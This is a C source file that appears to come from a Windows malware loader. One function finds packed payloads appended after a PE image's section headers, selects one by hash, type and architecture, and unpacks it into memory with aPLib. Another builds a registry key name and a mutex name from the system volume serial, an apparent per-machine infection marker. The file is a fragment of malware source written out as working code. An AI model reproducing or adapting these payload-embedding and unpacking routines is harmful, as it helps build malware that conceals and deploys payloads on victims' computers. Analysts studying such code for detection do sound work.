#include "Vfs.h"
#include "Guid.h"
#include "../Inc/aplib.h"
#include "Setup.h"

BOOLEAN GetJoinedData(PIMAGE_DOS_HEADER	LoaderBase,PCHAR* pBuffer,PULONG pSize,BOOLEAN bIs64Bit,ULONG ulNameHash,ULONG ulTypeFlags)
{
	BOOLEAN bRet = FALSE;
	PIMAGE_NT_HEADERS pNtHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PADDON_DESCRIPTOR pAdDDesc;
	PCHAR pUnpacked;

	pNtHeader = (PIMAGE_NT_HEADERS)((PCHAR)LoaderBase + LoaderBase->e_lfanew);
	pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
	pAdDDesc = (PADDON_DESCRIPTOR)(pSectionHeader + pNtHeader->FileHeader.NumberOfSections + 1);

	while (pAdDDesc->Magic != 0 && pAdDDesc->Magic != ADDON_MAGIC)
	{
		pAdDDesc += 1;
	}
	while (pAdDDesc->Magic == ADDON_MAGIC)
	{
		if ((!ulTypeFlags || (pAdDDesc->Flags & ulTypeFlags)) && (!ulNameHash || (pAdDDesc->ImageId == ulNameHash)))
		{
			if (((pAdDDesc->Flags & PE_FLAG_X64) && bIs64Bit) || (!(pAdDDesc->Flags & PE_FLAG_X64) && !bIs64Bit))
			{
				if (pUnpacked = (PCHAR)AllocateMemory(pAdDDesc->ImageSize + 1))
				{
					if (((pAdDDesc->Flags & TARGET_FLAG_PACKED) && \
						(aP_depack((PCHAR)LoaderBase + pAdDDesc->ImageRva,pUnpacked) == pAdDDesc->ImageSize)) || \
						(!(pAdDDesc->Flags & TARGET_FLAG_PACKED) && \
						memcpy(pUnpacked,(PCHAR)LoaderBase + pAdDDesc->ImageRva, pAdDDesc->ImageSize)))
					{
						pUnpacked[pAdDDesc->ImageSize] = 0;
						*pBuffer = pUnpacked;
						*pSize = pAdDDesc->ImageSize;
						bRet = TRUE;
						break;
					}
					else
					{
						FreeMemory(pUnpacked);
					}
				}
			}
		}
		pAdDDesc = (PADDON_DESCRIPTOR)((PCHAR)pAdDDesc + pAdDDesc->NumberHashes * sizeof(ULONG));
		pAdDDesc += 1;
	}
	return bRet;
}
BOOLEAN GetProgramKeyName(PWCHAR *pKeyNameW,PWCHAR *pMutexNameW)
{
	BOOLEAN bRet;
	PWCHAR pRootDirectoryW;
	PWCHAR pSlashW;
	ULONG ulVolumeSerial;
	PWCHAR KeyNameW;
	PWCHAR MutexName;


	ulVolumeSerial = 0;
	pSlashW = NULL;
	pRootDirectoryW = NULL;
	bRet = FALSE;
	KeyNameW = NULL;
	MutexName = NULL;

	do 
	{
		pRootDirectoryW = (PWCHAR)AllocateMemory(PAGE_SIZE);
	} while (NULL == pRootDirectoryW);
	RtlZeroMemory(pRootDirectoryW,PAGE_SIZE);
	if (GetWindowsDirectory(pRootDirectoryW,PAGE_SIZE))
	{
		pSlashW = wcschr(pRootDirectoryW,L'\\');
		if (pSlashW)
		{
			pSlashW[1] = 0;
		}
		if (GetVolumeInformation(pRootDirectoryW, \
			NULL, \
			0, \
			&ulVolumeSerial, \
			NULL, \
			NULL, \
			NULL, \
			0))
		{
			if ((KeyNameW = GuidName(&ulVolumeSerial,PROGRAMKEYNAME)) && (MutexName = GuidName(&ulVolumeSerial,LOCALNAME)))
			{
				*pKeyNameW = KeyNameW;
				*pMutexNameW = MutexName;
				bRet = TRUE;
			}
		}
		FreeMemory(pRootDirectoryW);
	}
	return bRet;
}